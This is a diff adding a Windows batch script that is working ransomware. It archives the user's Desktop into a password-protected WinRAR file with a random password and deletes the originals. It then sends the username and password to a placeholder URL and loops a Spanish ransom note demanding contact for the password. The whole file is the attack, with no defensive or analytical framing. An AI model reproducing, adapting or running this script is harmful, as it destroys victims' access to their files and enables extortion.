@@ -1,0 +1,28 @@
+@echo off
+@echo off
+title cracks
+color 02
+set A=C:\"Program Files"\WinRAR\
+set B=C:\USERS\%USERNAME%\
+set C=NePtYx%RANDOM%
+set D=Encry%RANDOM%
+%A%rar.exe a -df -p%C% %B%%D%.rar %B%Desktop
+start urlaqui/url.php?nombre=Usuario:+%USERNAME%+Cifrado:+%C%
+:ransom
+cls
+color 02
+echo  ______________________
+echo [ Archivos Encriptados ]
+echo  ----------------------
+echo         \   /\_/\          Created by NY and cracks
+echo          \  (oo)\_______        
+echo             (__)\       )\/\    
+echo                 II----w I
+echo                 II     II
+echo  -------------------------------------------------------
+echo    Debes contactarme en nose
+echo    para obtener la contrasena de tus datos :D
+echo    Tus archivos: %B%%D% Encriptacion: SSHA
+echo  -------------------------------------------------------
+pause
+goto ransom
